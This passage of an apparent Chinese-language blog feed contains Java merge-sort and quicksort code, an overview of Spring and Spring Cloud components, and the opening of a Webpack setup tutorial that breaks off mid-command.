class="number">2</span>;</div><div class="line">        <span class="keyword">if</span> (low &lt; high) &#123;</div><div class="line">            <span class="comment">// 左边</span></div><div class="line">            mergeSort(nums, low, mid);</div><div class="line">            <span class="comment">// 右边</span></div><div class="line">            mergeSort(nums, mid + <span class="number">1</span>, high);</div><div class="line">            <span class="comment">// 左右归并</span></div><div class="line">            merge(nums, low, mid, high);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> nums;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">/**</span></div><div class="line"><span class="comment">     * 将数组中low到high位置的数进行排序</span></div><div class="line"><span class="comment">     * </span></div><div class="line"><span class="comment">     * <span class="doctag">@param</span> nums</span></div><div class="line"><span class="comment">     *            待排序数组</span></div><div class="line"><span class="comment">     * <span class="doctag">@param</span> low</span></div><div class="line"><span class="comment">     *            待排的开始位置</span></div><div class="line"><span class="comment">     * <span class="doctag">@param</span> mid</span></div><div class="line"><span class="comment">     *            待排中间位置</span></div><div class="line"><span class="comment">     * <span class="doctag">@param</span> high</span></div><div class="line"><span class="comment">     *            待排结束位置</span></div><div class="line"><span class="comment">     */</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> low, <span class="keyword">int</span> mid, <span class="keyword">int</span> high)</span> </span>&#123;</div><div class="line">        <span class="keyword">int</span>[] temp = <span class="keyword">new</span> <span class="keyword">int</span>[high - low + <span class="number">1</span>];</div><div class="line">        <span class="keyword">int</span> i = low;<span class="comment">// 左指针</span></div><div class="line">        <span class="keyword">int</span> j = mid + <span class="number">1</span>;<span class="comment">// 右指针</span></div><div class="line">        <span class="keyword">int</span> k = <span class="number">0</span>;</div><div class="line"></div><div class="line">        <span class="comment">// 把较小的数先移到新数组中</span></div><div class="line">        <span class="keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= high) &#123;</div><div class="line">            <span class="keyword">if</span> (nums[i] &lt; nums[j]) &#123;</div><div class="line">                temp[k++] = nums[i++];</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                temp[k++] = nums[j++];</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment">// 把左边剩余的数移入数组</span></div><div class="line">        <span class="keyword">while</span> (i &lt;= mid) &#123;</div><div class="line">            temp[k++] = nums[i++];</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment">// 把右边边剩余的数移入数组</span></div><div class="line">        <span class="keyword">while</span> (j &lt;= high) &#123;</div><div class="line">            temp[k++] = nums[j++];</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment">// 把新数组中的数覆盖nums数组</span></div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k2 = <span class="number">0</span>; k2 &lt; temp.length; k2++) &#123;</div><div class="line">            nums[k2 + low] = temp[k2];</div><div class="line">        &#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure><h3 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h3><p>介绍：快速排序是一种分治的排序算法。它将一个数组分成两个字数组，将两部分独立地排序。快速排序和归并排序是互补的：归并排序将数组分成两个字数组分别排序，并将有序的字数组归并以将整个数组排序；而快速排序将数组排序的方式则是当两个字数组都有序时整个数组也就自然有序了。在第一种情况中，递归调用发生在处理整个数组之前；在第二种情况中，递归调用发生在处理整个数组之后。在归并排序中，一个数组被等分为两半；快速排序中，切分的位置取决于数组的内容。快速排序的过程大致如下： </p><p><img src="https://user-gold-cdn.xitu.io/2017/11/3/f0b0af75a81adfdab85ae28aba269d62" alt="描述"></p><p>原理：通过一趟排序将待排序记录分割成独立的两部分，一部分全小于选取的参考值，另一部分全大于选取的参考值。这样分别对两部分排序之后顺序就可以排好了。</p><ol><li>一趟排序的过程<br><img src="https://user-gold-cdn.xitu.io/2017/11/3/ee0a28c59d1fc0128fc89c5588d1e61a" alt="描述"></li><li>排序的全过程<br><img src="https://user-gold-cdn.xitu.io/2017/11/3/f1501296ffa100572468f4c73061f7d6" alt="描述"></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"><span class="comment">    * 查找出中轴（默认是最低位low）的在numbers数组排序后所在位置</span></div><div class="line"><span class="comment">    * </span></div><div class="line"><span class="comment">    * <span class="doctag">@param</span> numbers 带查找数组</span></div><div class="line"><span class="comment">    * <span class="doctag">@param</span> low 开始位置</span></div><div class="line"><span class="comment">    * <span class="doctag">@param</span> high 结束位置</span></div><div class="line"><span class="comment">    * <span class="doctag">@return</span> 中轴所在位置</span></div><div class="line"><span class="comment">    */</span></div><div class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">getMiddle</span><span class="params">(<span class="keyword">int</span>[] numbers, <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span> </span>&#123;</div><div class="line">       <span class="comment">// 数组的第一个作为中轴</span></div><div class="line">       <span class="keyword">int</span> temp = numbers[low]; </div><div class="line">       <span class="keyword">while</span> (low &lt; high) &#123;</div><div class="line">           <span class="keyword">while</span> (low &lt; high &amp;&amp; numbers[high] &gt; temp) &#123;</div><div class="line">               high--;</div><div class="line">           &#125;</div><div class="line">           <span class="comment">// 比中轴小的记录移到低端</span></div><div class="line">           numbers[low] = numbers[high];</div><div class="line">           <span class="keyword">while</span> (low &lt; high &amp;&amp; numbers[low] &lt; temp) &#123;</div><div class="line">               low++;</div><div class="line">           &#125;</div><div class="line">           <span class="comment">// 比中轴大的记录移到高端</span></div><div class="line">           numbers[high] = numbers[low]; </div><div class="line">       &#125;</div><div class="line">       numbers[low] = temp; <span class="comment">// 中轴记录到尾</span></div><div class="line">       <span class="keyword">return</span> low; <span class="comment">// 返回中轴的位置</span></div><div class="line">   &#125;</div><div class="line"></div><div class="line">   <span class="comment">/**</span></div><div class="line"><span class="comment">    * </span></div><div class="line"><span class="comment">    * <span class="doctag">@param</span> numbers 带排序数组</span></div><div class="line"><span class="comment">    * <span class="doctag">@param</span> low 开始位置</span></div><div class="line"><span class="comment">    * <span class="doctag">@param</span> high 结束位置</span></div><div class="line"><span class="comment">    */</span></div><div class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">quick</span><span class="params">(<span class="keyword">int</span>[] numbers, <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span> </span>&#123;</div><div class="line">       <span class="keyword">if</span> (low &lt; high) &#123;</div><div class="line">           <span class="keyword">int</span> middle = getMiddle(numbers, low, high); <span class="comment">// 将numbers数组进行一分为二</span></div><div class="line">           quick(numbers, low, middle - <span class="number">1</span>); <span class="comment">// 对低字段表进行递归排序</span></div><div class="line">           quick(numbers, middle + <span class="number">1</span>, high); <span class="comment">// 对高字段表进行递归排序</span></div><div class="line">       &#125;</div><div class="line"></div><div class="line">   &#125;</div><div class="line"></div><div class="line">   <span class="comment">/**</span></div><div class="line"><span class="comment">    * 快速排序</span></div><div class="line"><span class="comment">    * 快速排序提供方法调用</span></div><div class="line"><span class="comment">    * <span class="doctag">@param</span> numbers 带排序数组</span></div><div class="line"><span class="comment">    */</span></div><div class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">quickSort</span><span class="params">(<span class="keyword">int</span>[] numbers)</span> </span>&#123;</div><div class="line">       <span class="comment">// 查看数组是否为空</span></div><div class="line">       <span class="keyword">if</span> (numbers.length &gt; <span class="number">0</span>) </div><div class="line">       &#123;</div><div class="line">           quick(numbers, <span class="number">0</span>, numbers.length - <span class="number">1</span>);</div><div class="line">       &#125;</div><div class="line">   &#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;排序就是将一组对象按照某种逻辑顺序重新排列的过程。比如信用卡账单中的交易是按照日期排序的——这种排序很可能使用了某种排序算法。在计算时代早期
      
    
    </summary>
    
      <category term="后端" scheme="http://yoursite.com/categories/%E5%90%8E%E7%AB%AF/"/>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
      <category term="算法" scheme="http://yoursite.com/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>Spring框架及Spring Cloud框架主要组件</title>
    <link href="http://yoursite.com/2017/04/06/Spring%E6%A1%86%E6%9E%B6%E5%8F%8ASpring%20Cloud%E6%A1%86%E6%9E%B6%E4%B8%BB%E8%A6%81%E7%BB%84%E4%BB%B6/"/>
    <id>http://yoursite.com/2017/04/06/Spring框架及Spring Cloud框架主要组件/</id>
    <published>2017-04-06T05:43:56.000Z</published>
    <updated>2018-01-16T16:58:31.497Z</updated>
    
    <content type="html"><![CDATA[<p>spring 顶级项目：<br>Spring IO platform:用于系统部署，是可集成的，构建现代化应用的版本平台，具体来说当你使用maven dependency引入spring jar包时它就在工作了。<br>Spring Boot:旨在简化创建产品级的 Spring 应用和服务，简化了配置文件，使用嵌入式web服务器，含有诸多开箱即用微服务功能，可以和spring cloud联合部署。<br>Spring Framework:即通常所说的spring 框架，是一个开源的Java/Java EE全功能栈应用程序框架，其它spring项目如spring boot也依赖于此框架。<br>Spring Cloud：微服务工具包，为开发者提供了在分布式系统的配置管理、服务发现、断路器、智能路由、微代理、控制总线等开发工具包。<br>Spring XD：是一种运行时环境（服务器软件，非开发框架），组合spring技术，如spring batch、spring boot、spring data，采集大数据并处理。<br>Spring Data：是一个数据访问及操作的工具包，封装了很多种数据及数据库的访问相关技术，包括：jdbc、Redis、MongoDB、Neo4j等。<br>Spring Batch：批处理框架，或说是批量任务执行管理器，功能包括任务调度、日志记录/跟踪等。<br>Spring Security：是一个能够为基于Spring的企业应用系统提供声明式的安全访问控制解决方案的安全框架。<br>Spring Integration：面向企业应用集成（EAI/ESB）的编程框架，支持的通信方式包括HTTP、FTP、TCP/UDP、JMS、RabbitMQ、Email等。<br>Spring Social：一组工具包，一组连接社交服务API，如Twitter、Facebook、LinkedIn、GitHub等，有几十个。<br>Spring AMQP：消息队列操作的工具包，主要是封装了RabbitMQ的操作。<br>Spring HATEOAS：是一个用于支持实现超文本驱动的 REST Web 服务的开发库。<br>Spring Mobile：是Spring MVC的扩展，用来简化手机上的Web应用开发。<br>Spring for Android：是Spring框架的一个扩展，其主要目的在乎简化Android本地应用的开发，提供RestTemplate来访问Rest服务。<br>Spring Web Flow：目标是成为管理Web应用页面流程的最佳方案，将页面跳转流程单独管理，并可配置。<br>Spring LDAP：是一个用于操作LDAP的Java工具包，基于Spring的JdbcTemplate模式，简化LDAP访问。<br>Spring Session：session管理的开发工具包，让你可以把session保存到redis等，进行集群化session管理。<br>Spring Web Services：是基于Spring的Web服务框架，提供SOAP服务开发，允许通过多种方式创建Web服务。<br>Spring Shell：提供交互式的Shell可让你使用简单的基于Spring的编程模型来开发命令，比如Spring Roo命令。<br>Spring Roo：是一种Spring开发的辅助工具，使用命令行操作来生成自动化项目，操作非常类似于Rails。<br>Spring Scala：为Scala语言编程提供的spring框架的封装（新的编程语言，Java平台的Scala于2003年底/2004年初发布）。<br>Spring BlazeDS Integration：一个开发RIA工具包，可以集成Adobe Flex、BlazeDS、Spring以及Java技术创建RIA。<br>Spring Loaded：用于实现java程序和web应用的热部署的开源工具。<br>Spring REST Shell：可以调用Rest服务的命令行工具，敲命令行操作Rest服务。</p><p>目前来说spring主要集中于spring boot（用于开发微服务）和spring cloud相关框架的开发，spring cloud子项目包括：</p><p>Spring Cloud Config：配置管理开发工具包，可以让你把配置放到远程服务器，目前支持本地存储、Git以及Subversion。<br>Spring Cloud Bus：事件、消息总线，用于在集群（例如，配置变化事件）中传播状态变化，可与Spring Cloud Config联合实现热部署。<br>Spring Cloud Netflix：针对多种Netflix组件提供的开发工具包，其中包括Eureka、Hystrix、Zuul、Archaius等。<br>Netflix Eureka：云端负载均衡，一个基于 REST 的服务，用于定位服务，以实现云端的负载均衡和中间层服务器的故障转移。<br>Netflix Hystrix：容错管理工具，旨在通过控制服务和第三方库的节点,从而对延迟和故障提供更强大的容错能力。<br>Netflix Zuul：边缘服务工具，是提供动态路由，监控，弹性，安全等的边缘服务。<br>Netflix Archaius：配置管理API，包含一系列配置管理API，提供动态类型化属性、线程安全配置操作、轮询框架、回调机制等功能。<br>Spring Cloud for Cloud Foundry：通过Oauth2协议绑定服务到CloudFoundry，CloudFoundry是VMware推出的开源PaaS云平台。<br>Spring Cloud Sleuth：日志收集工具包，封装了Dapper,Zipkin和HTrace操作。<br>Spring Cloud Data Flow：大数据操作工具，通过命令行方式操作数据流。<br>Spring Cloud Security：安全工具包，为你的应用程序添加安全控制，主要是指OAuth2。<br>Spring Cloud Consul：封装了Consul操作，consul是一个服务发现与配置工具，与Docker容器可以无缝集成。<br>Spring Cloud Zookeeper：操作Zookeeper的工具包，用于使用zookeeper方式的服务注册和发现。<br>Spring Cloud Stream：数据流操作开发包，封装了与Redis,Rabbit、Kafka等发送接收消息。<br>Spring Cloud CLI：基于 Spring Boot CLI，可以让你以命令行方式快速建立云组件。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;spring 顶级项目：&lt;br&gt;Spring IO platform:用于系统部署，是可集成的，构建现代化应用的版本平台，具体来说当你使用maven dependency引入spring jar包时它就在工作了。&lt;br&gt;Spring Boot:旨在简化创建产品级的 Spri
      
    
    </summary>
    
      <category term="后端" scheme="http://yoursite.com/categories/%E5%90%8E%E7%AB%AF/"/>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Webpack</title>
    <link href="http://yoursite.com/2017/03/11/Webpack/"/>
    <id>http://yoursite.com/2017/03/11/Webpack/</id>
    <published>2017-03-11T15:16:06.000Z</published>
    <updated>2018-01-16T16:05:32.240Z</updated>
    
    <content type="html"><![CDATA[<h3 id="什么是webpack"><a href="#什么是webpack" class="headerlink" title="什么是webpack"></a>什么是webpack</h3><p>webpack是一个module bundler（模块打包工具），所谓的模块就是在平时的前端开发中，用到一些静态资源，如JavaScript、CSS、图片等文件，webpack就将这些静态资源文件称之为模块。 webpack支持AMD和CommonJS，以及其他的一些模块系统，并且兼容多种JS书写规范，可以处理模块间的依赖关系，所以具有更强大的JS模块化的功能，它能对静态资源进行统一的管理以及打包发布。 它在很多地方都能替代Grunt和Gulp，因为它能够编译打包CSS，做CSS预处理，对JS的方言进行编译，打包图片，代码压缩等等。</p><h3 id="为什么使用webpack"><a href="#为什么使用webpack" class="headerlink" title="为什么使用webpack"></a>为什么使用webpack</h3><ul><li>对 CommonJS 、AMD 、ES6的语法做了兼容；</li><li>对js、css、图片等资源文件都支持打包；</li><li>串联式模块加载器以及插件机制,让其具有更好的灵活性和扩展性，例如提供对CoffeeScript、ES6的支持；</li><li>有独立的配置文件webpack.config.js；</li><li>可以将代码切割成不同的chunk，实现按需加载，降低了初始化时间；</li><li>支持 SourceUrls 和 SourceMaps，易于调试；</li><li>具有强大的Plugin接口，大多是内部插件，使用起来比较灵活；</li><li>webpack 使用异步 IO 并具有多级缓存。这使得 webpack 很快且在增量编译上更加快；</li></ul><h3 id="webpack为什么要将所有资源放在一个文件里面？"><a href="#webpack为什么要将所有资源放在一个文件里面？" class="headerlink" title="webpack为什么要将所有资源放在一个文件里面？"></a>webpack为什么要将所有资源放在一个文件里面？</h3><p>我们知道，对于浏览器来说，加载的资源越少，响应的速度也就越快，所以有时候我们为了优化浏览器的性能，会尽可能的将资源合并到一个主文件app.js里面。但是这导致的很大的缺点：<br>当你的项目十分庞大的时候，不同的页面不能做到按需加载，而是将所有的资源一并加载，耗费时间长，性能降低。<br>会导致依赖库之间关系的混乱，特别是大型项目时，会变得难以维护和跟踪。比如:哪些文件是需要A模块加载完后才能执行的？哪些页面会受到多个样式表同时影响的？ 等许多问题。<br>而webpack可以很好的解决以上缺点,因为它是一个十分聪明的模块打包系统，当你正确配置后，它会比你想象中的更强大，更优秀。</p><h3 id="WebPack和Grunt以及Gulp相比有什么特性"><a href="#WebPack和Grunt以及Gulp相比有什么特性" class="headerlink" title="WebPack和Grunt以及Gulp相比有什么特性"></a>WebPack和Grunt以及Gulp相比有什么特性</h3><p>其实Webpack和另外两个并没有太多的可比性，Gulp/Grunt是一种能够优化前端的开发流程的工具，而WebPack是一种模块化的解决方案，不过Webpack的优点使得Webpack在很多场景下可以替代Gulp/Grunt类的工具。<br>Grunt和Gulp的工作方式是：在一个配置文件中，指明对某些文件进行类似编译，组合，压缩等任务的具体步骤，工具之后可以自动替你完成这些任务。</p><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p>创建目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mkdir myapp</div></pre></td></tr></table></figure></p><p>进入目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cd myapp</div></pre></td></tr></table></figure></p><p>使用命令自动创建package.json文件；<br>这是一个标准的npm说明文件，里面蕴含了丰富的信息，包括当前项目的依赖模块，自定义的脚本任务等等<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm init</div></pre></td></tr></table></figure></p><p><strong>创建测试项目目录结构如图：</strong><br><img src="//upload-images.jianshu.io/upload_images/1031000-976ba1a06fd0702f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/347" alt="这里写图片描述"></p><p>我们在index.html文件中写入最基础的html代码，它在这里目的在于引入打包后的js文件（这里我们先把之后打包后的js文件命名为bundle.js，之后我们还会详细讲述）。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!-- index.html --&gt;</span></div><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Webpack Sample Project<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">'root'</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"bundle.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p><p>我们在Greeter.js中定义一个返回包含问候信息的html元素的函数,并依据CommonJS规范导出这个函数为一个模块：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// Greeter.js</span></div><div class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> greet = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</div><div class="line">  greet.textContent = <span class="string">"Hi there and greetings!"</span>;</div><div class="line">  <span class="keyword">return</span> greet;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p><p>main.js文件中我们写入下述代码，用以把Greeter模块返回的节点插入页面。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//main.js </span></div><div class="line"><span class="keyword">const</span> greeter = <span class="built_in">require</span>(<span class="string">'./Greeter.js'</span>);</div><div class="line"><span class="built_in">document</span>.querySelector(<span class="string">"#root"</span>).appendChild(greeter());</div></pre></td></tr></table></figure><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">//全局安装</div><div class="line">npm install -g webpack</div></pre></td></tr></table></figure><p>在本项目中安装Webpack作为依赖包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">// 安装Webpack</div><div class="line">npm </div><div class="line">install --save-dev webpack</div></pre></td></tr></table></figure></p><h3 id="正式使用Webpack"><a href="#正式使用Webpack" class="headerlink" title="正式使用Webpack"></a>正式使用Webpack</h3><p>webpack可以在终端中使用，在基本的使用方法如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># &#123;extry file&#125;出填写入口文件的路径，本文中就是上述main.js的路径，</div><div class="line"># &#123;destination for bundled file&#125;处填写打包文件的存放路径</div><div class="line"># 填写路径的时候不用添加&#123;&#125;</div><div class="line">webpack &#123;entry file&#125; &#123;destination for bundled file&#125;</div></pre></td></tr></table></figure></p><p>指定入口文件后，webpack将自动识别项目所依赖的其它文件，不过需要注意的是如果你的webpack不是全局安装的，那么当你在终端中使用此命令时，需要额外指定其在node_modules中的地址，继续上面的例子，在终端中输入如下命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># webpack非全局安装的情况</div><div class="line">node_modules/.bin/webpack app/main.js public/bundle.js</div></pre></td></tr></table></figure></p><p><img src="//upload-images.jianshu.io/upload_images/1031000-b9e69a58e3518ba7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700" alt="这里写图片描述"></p><p>可以看出webpack同时编译了main.js 和Greeter,js,现在打开index.html,可以看到如下结果</p><p><img src="//upload-images.jianshu.io/upload_images/1031000-6cf1ecc41ef8c31d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700" alt="这里写图片描述"></p><h3 id="通过配置文件来使用Webpack"><a href="#通过配置文件来使用Webpack" class="headerlink" title="通过配置文件来使用Webpack"></a>通过配置文件来使用Webpack</h3><p>在当前练习文件夹的根目录下新建一个名为webpack.config.js的文件，我们在其中写入如下所示的简单配置代码，目前的配置主要涉及到的内容是入口文件路径和打包后文件的存放路径。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">module.exports = &#123;</div><div class="line">  entry:  __dirname + &quot;/app/main.js&quot;,//已多次提及的唯一入口文件</div><div class="line">  output: &#123;</div><div class="line">    path: __dirname + &quot;/public&quot;,//打包后的文件存放的地方</div><div class="line">    filename: &quot;bundle.js&quot;//打包后输出文件的文件名</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><blockquote><p><strong>注：</strong>“__dirname”是node.js中的一个全局变量，它指向当前执行脚本所在的目录。</p></blockquote><p>有了这个配置之后，再打包文件，只需在终端里运行webpack就可以了</p><h3 id="更快捷的执行打包任务"><a href="#更快捷的执行打包任务" class="headerlink" title="更快捷的执行打包任务"></a>更快捷的执行打包任务</h3><p>在命令行中输入命令需要代码类似于node_modules/.bin/webpack这样的路径其实是比较烦人的，不过值得庆幸的是npm可以引导任务执行，对npm进行配置后可以在命令行中使用简单的npm start命令来替代上面略微繁琐的命令。在package.json中对scripts对象进行相关设置即可，设置方法如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">  &quot;name&quot;: &quot;webpack-sample-project&quot;,</div><div class="line">  &quot;version&quot;: &quot;1.0.0&quot;,</div><div class="line">  &quot;description&quot;: &quot;Sample webpack project&quot;,</div><div class="line">  &quot;scripts&quot;: &#123;</div><div class="line">    &quot;start&quot;: &quot;webpack&quot; // 修改的是这里，JSON文件不支持注释，引用时请清除</div><div class="line">  &#125;,</div><div class="line">  &quot;author&quot;: &quot;zhang&quot;,</div><div class="line">  &quot;license&quot;: &quot;ISC&quot;,</div><div class="line">  &quot;devDependencies&quot;: &#123;</div><div class="line">    &quot;webpack&quot;: &quot;3.10.0&quot;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><blockquote><p><strong>注：</strong>package.json中的script会安装一定顺序寻找命令对应位置，本地的node_modules/.bin路径就在这个寻找清单中，所以无论是全局还是局部安装的Webpack，你都不需要写前面那指明详细的路径了。**<br>npm的start命令是一个特殊的脚本名称，其特殊性表现在，在命令行中使用npm start就可以执行其对于的命令，如果对应的此脚本名称不是start，想要在命令行中运行时，需要这样用npm run {script name}如npm run build</p></blockquote><h3 id="生成Source-Maps（使调试更容易）"><a href="#生成Source-Maps（使调试更容易）" class="headerlink" title="生成Source Maps（使调试更容易）"></a>生成Source Maps（使调试更容易）</h3><p>开发总是离不开调试，方便的调试能极大的提高开发效率，不过有时候通过打包后的文件，你是不容易找到出错了的地方，对应的你写的代码的位置的，Source Maps就是来帮我们解决这个问题的。</p><p>通过简单的配置，webpack就可以在打包时为我们生成的source maps，这为我们提供了一种对应编译文件和源文件的方法，使得编译后的代码可读性更高，也更容易调试。</p><p>在webpack的配置文件中配置source maps，需要配置devtool，它有以下四种不同的配置选项，各具优缺点，描述如下：</p><p><strong>source-map:</strong><br>在一个单独的文件中产生一个完整且功能完全的文件。这个文件具有最好的source map，但是它会减慢打包速度；</p><p><strong>cheap-module-source-map:</strong><br>在一个单独的文件中生成一个不带列映射的map，不带列映射提高了打包速度，但是也使得浏览器开发者工具只能对应到具体的行，不能对应到具体的列（符号），会对调试造成不便；</p><p><strong>eval-source-map:</strong><br>使用eval打包源文件模块，在同一个文件中生成干净的完整的source map。这个选项可以在不影响构建速度的前提下生成完整的sourcemap，但是对打包后输出的JS文件的执行具有性能和安全的隐患。在开发阶段这是一个非常好的选项，在生产阶段则一定不要启用这个选项；</p><p><strong>cheap-module-eval-source-map:</strong><br>这是在打包文件时最快的生成source map的方法，生成的Source Map 会和打包后的JavaScript文件同行显示，没有列映射，和eval-source-map选项具有相似的缺点；</p><p>对小到中型的项目中，eval-source-map是一个很好的选项，再次强调你只应该开发阶段使用它，我们继续对上文新建的webpack.config.js，进行如下配置:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">module.exports = &#123;</div><div class="line">  devtool: &apos;eval-source-map&apos;,</div><div class="line">  entry:  __dirname + &quot;/app/main.js&quot;,</div><div class="line">  output: &#123;</div><div class="line">    path: __dirname + &quot;/public&quot;,</div><div class="line">    filename: &quot;bundle.js&quot;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><blockquote><p>cheap-module-eval-source-map方法构建速度更快，但是不利于调试，推荐在大型项目考虑时间成本时使用。</p></blockquote><h3 id="使用webpack构建本地服务器"><a href="#使用webpack构建本地服务器" class="headerlink" title="使用webpack构建本地服务器"></a>使用webpack构建本地服务器</h3><p>想不想让你的浏览器监听你的代码的修改，并自动刷新显示修改后的结果，其实Webpack提供一个可选的本地开发服务器，这个本地服务器基于node.js构建，可以实现你想要的这些功能，不过它是一个单独的组件，在webpack中进行配置之前需要单独安装它作为项目依赖</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install --save-dev 